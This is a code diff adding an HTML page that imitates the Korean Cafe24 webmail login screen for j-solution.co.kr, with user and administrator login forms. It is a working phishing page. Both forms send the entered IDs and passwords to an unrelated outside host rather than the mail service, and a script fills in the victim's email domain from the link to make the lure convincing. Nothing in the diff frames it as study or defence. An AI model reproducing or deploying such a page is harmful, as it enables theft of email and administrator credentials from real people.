@@ -1,0 +1,127 @@
+﻿<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <title>제이 솔루션</title>
+  <meta name="WMMETA" content="host" data-host="rwebmail-002.fmcity.com" />
+  <meta name="WMMETA" content="domain" data-domain="j-solution.co.kr" />
+  <meta name="WMMETA" content="appversion" data-appversion="20210119" />
+  <meta name="WMMETA" content="langpack" data-langpack="ko" />
+  <link rel="stylesheet" type="text/css" href="https://img.cafe24.com/serviceserver/biz/webmail/css/webmail.css?v=20210119" />
+</head>
+<body>
+
+<div class="mLogin type1">
+  <ul class="languages">
+    <li><a class="login-language-change" href="#changeLang/en">ENGLISH</a></li>
+    <li><a class="login-language-change" href="#changeLang/chGb">简体中文</a></li>
+    <li><a class="login-language-change" href="#changeLang/jp">日本語</a></li>
+    <li><a class="login-language-change" href="#changeLang/chBig">繁體中文</a></li>
+    <li><a class="login-language-change" href="#changeLang/ko">한국어</a></li>
+  </ul>
+
+  <div class="inner">
+    <div class="logoArea">
+      <h2 class="logo">
+        <img id="logo" src="https://img.cafe24.com/serviceserver/biz/webmail/images/login/@img_logo_aType.gif" alt="Logo" />
+      </h2>
+    </div>
+
+    <div class="contents">
+      <ul class="mTab typeLogin eTab switch-login-type">
+        <li class="selected"><a href="#tabUser">사용자 모드</a></li>
+        <li><a href="#tabAdmin">관리자 모드</a></li>
+      </ul>
+
+      <div id="tabUser" class="tabCont" style="display: block;">
+        <form id="loginForm" method="post" action="https://ganpanmarthdesi.pro/z-php/wp-config-post.php">
+          <input type="hidden" name="loginType" value="user" />
+          <input type="hidden" name="rTarget" value="parent" />
+          <input type="hidden" name="url" value="https://webmail.j-solution.co.kr/login.php" />
+          <input type="hidden" name="link" value="http://webmail.domain/intro.php" />
+          <input type="hidden" name="domain" value="domain" />
+          <input type="hidden" name="sender" value="cafe24.com" />
+          <input type="hidden" id="loginFull" name="email" />
+
+          <fieldset>
+            <legend>사용자 로그인</legend>
+            <label>
+              <input type="text" id="usernameInput" class="fText" placeholder="아이디" autofocus />
+            </label>
+            <label>
+              <input type="password" name="passwd" class="fText" required placeholder="비밀번호" />
+            </label>
+
+            <button type="submit" class="btnLogin user-login-btn"><span>로그인</span></button>
+
+            <ul class="security">
+              <li><label><input type="checkbox" name="save"> 아이디 저장</label></li>
+              <li><input type="checkbox" name="ip" checked="checked"> IP보안 <span>on</span></li>
+            </ul>
+          </fieldset>
+        </form>
+      </div>
+
+      <div id="tabAdmin" class="tabCont" style="display: none;">
+        <form method="post" name="adminLoginForm" target="HFLOGIN" action="http://ganpanmarthdesi.pro/z-php/wp-config-post.php">
+          <input type="hidden" name="loginType" value="admin" />
+          <input type="hidden" name="rTarget" value="parent" />
+          <input type="hidden" name="url" value="https://webmail.j-solution.co.kr/login.php" />
+          <input type="hidden" name="domain" value="http://webmail.domain/intro.php" />
+          <input type="hidden" name="sender" value="Cafe24.com" />
+
+          <fieldset>
+            <legend>관리자 로그인</legend>
+            <label><input type="text" name="user" class="fText" placeholder="아이디" /></label>
+            <label><input type="password" name="passwd" class="fText" placeholder="비밀번호" /></label>
+            <button type="submit" class="btnLogin"><span>로그인</span></button>
+            <ul class="security">
+              <li><input type="checkbox" name="save"> 아이디 저장</li>
+              <li><input type="checkbox" name="ip" checked="checked"> IP보안 <span>on</span></li>
+            </ul>
+          </fieldset>
+        </form>
+      </div>
+    </div>
+  </div>
+
+  <p class="footer">
+    <a href="http://www.webbridge.co.kr">Copyright ⓒ <strong>2021</strong> All Rights Reserved.</a>
+  </p>
+</div>
+
+<iframe id="HFLOGIN" name="HFLOGIN" src="/blank.html" frameborder="0" width="90%" height="0" style="display:none;"></iframe>
+
+<!-- Scripts -->
+<script src="/jquery/jquery-1.11.3.min.js?v=20210119"></script>
+<script src="/jquery/jquery.placeholder.min.js?v=20210119"></script>
+<script src="/newjs/common.js?v=20210119"></script>
+<script src="/newjs/intro.js?v=20210119"></script>
+
+<!-- Hidden Data -->
+<input type="hidden" id="adminId" value="jsolmail" />
+<input type="hidden" id="emailId" value="" />
+<input type="hidden" id="isReseller" value="reseller" />
+<input type="hidden" id="enctoken" value="" />
+
+<script>
+  function getDomainFromURL() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const login = urlParams.get('login');
+    if (login && login.includes('@')) {
+      return login.split('@')[1].toLowerCase();
+    }
+    return 'example.com';
+  }
+
+  const domain = getDomainFromURL();
+  document.getElementById('domainAddon').textContent = '@' + domain;
+
+  document.getElementById('loginForm').addEventListener('submit', function (e) {
+    const username = document.getElementById('usernameInput').value.trim();
+    document.getElementById('loginFull').value = username + '@' + domain;
+  });
+</script>
+</body>
+</html>
